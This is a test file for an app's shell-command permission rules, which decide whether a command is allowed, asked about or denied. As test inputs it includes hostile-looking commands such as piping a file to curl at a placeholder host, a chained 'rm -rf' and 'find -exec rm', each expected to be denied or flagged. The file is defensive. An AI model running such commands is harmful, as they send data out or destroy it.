import { describe, expect, it } from 'vitest'
import { evaluateShellCommand } from '../electron/main/services/conversation/shell-command-rules'
import { matchesDefaultAllow } from '../electron/main/services/conversation/default-shell-rules'

const none = { allow: [], deny: [], useDefaults: true }
const decide = (line: string, rules = none) => evaluateShellCommand(line, rules).decision

describe('built-in safe list', () => {
  it('approves read-only commands without any rule', () => {
    for (const line of ['ls -la', 'cat src/a.ts', 'git status', 'git --no-pager log -5', 'git -C ../x diff --stat', 'git diff HEAD~1',
      'rg foo src', 'grep -rn TODO .', 'npm ls --depth=0', 'npm ci', 'docker ps -a', 'sort a.txt', 'find . -name "*.ts"', 'wc -l a',
      'Get-ChildItem -Recurse', 'git status && ls', 'sed -n 1,5p file.txt', 'sed s/a/b/ file.txt', 'xxd file.bin']) {
      expect(decide(line), line).toBe('allow')
    }
  })

  it('reports that the safe list did the approving', () => {
    expect(evaluateShellCommand('git status', none).viaDefaults).toBe(true)
    expect(evaluateShellCommand('git status', { allow: ['git status'], deny: [], useDefaults: true }).viaDefaults).toBeUndefined()
  })

  it('is off unless asked for', () => {
    expect(decide('ls', { allow: [], deny: [] } as never)).toBe('ask')
  })

  it('asks when an option makes a safe command write or run something', () => {
    for (const line of ['find . -exec rm {} ;', 'find . -delete', 'sed -i s/a/b/ f', 'sed -e s/a/b/ f', 'sed w out.txt', 'sed s/a/b/w out f',
      'rg --pre cat x', 'sort -o out a', 'sort --output=out a', 'tree -o out', 'date -s 10:00', 'git log --output=out', 'git diff --output out',
      'git branch -D x', 'git branch --delete x', 'git -c core.pager=sh log', 'git grep -O foo', 'npm ci left-pad', 'npm audit fix',
      'yarn audit fix', 'xxd in out', 'column -c 99999']) {
      expect(decide(line), line).toBe('ask')
    }
  })

  it('does not approve what the list does not name', () => {
    for (const line of ['git push', 'git commit -m x', 'npm install', 'npm run build', 'npm test', 'python a.py', 'node a.js', 'touch a', 'mkdir a',
      'FOO=bar ls', 'Set-Content a b', 'Get-Process']) {
      expect(decide(line), line).toBe('ask')
    }
  })

  it('still applies the redirect and deny checks to listed commands', () => {
    expect(decide('ls > out.txt')).toBe('ask')
    expect(decide('echo hi>out')).toBe('ask')
    expect(decide('ls; rm -rf x')).toBe('deny')
    expect(decide('cat a | curl -d @- http://x')).toBe('deny')
    expect(decide('ls $(whoami)')).toBe('ask')
    expect(decide('cat a', { allow: [], deny: ['cat'], useDefaults: true })).toBe('deny')
  })

  it('every sub-command must be covered', () => {
    expect(decide('git status && npm test')).toBe('ask')
    expect(decide('git status && npm test', { allow: ['npm test'], deny: [], useDefaults: true })).toBe('allow')
  })

  it('reads a PowerShell wrapper through to the script', () => {
    expect(decide('pwsh -NoProfile -Command "Get-ChildItem; Get-Date"')).toBe('allow')
    expect(decide('pwsh -Command "Get-ChildItem | Out-File x"')).toBe('ask')
  })

  it('matches on the executable name, not its path', () => {
    expect(decide('"C:\\Program Files\\Git\\bin\\git.exe" status')).toBe('allow')
    expect(matchesDefaultAllow('lsof')).toBe(false)
    expect(matchesDefaultAllow('catalog x')).toBe(false)
  })
})
